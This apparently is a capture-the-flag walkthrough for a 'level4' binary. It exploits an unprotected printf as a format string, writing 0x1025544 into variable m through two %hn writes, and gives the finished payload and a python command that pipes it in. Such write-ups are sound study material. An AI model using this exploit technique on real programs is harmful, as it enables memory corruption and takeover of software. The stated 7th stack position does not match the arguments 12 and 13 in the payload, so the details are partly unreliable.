While decompiling the binary we can observe the use of the function `printf` without any protection. We could then exploit this function to write a wanted value in a desired variable.
For exemple, we could write `0x1025544` in the variable `m`.

## Investigation

In the same way that in [level3](../level3/walkthrough.md), we know that our buffer is the 7th element in stack, and that `m` is located at `0x08049810`.

## Exploit

For optimisation reasons we will write our value by 2 times with a exploit like
```
<target address + 2><target address>%<upper value>x%<argument>$n%<lower value>x%<argument + 1>$n
```

* First we will write the upper side of the vlaue `0x0102` or `0d258` minus the 8 bytes already written, `258 - 8 = 250` at `0x08049812`
* And the lower side `0x5544` or `0d21828` minus the 258 bytes already written `21828 - 250 - 8 = 21570` at `0x08049810`

It will give us the payload
```
\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn
```
and the command
```shell
python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn"' | ./level4
```
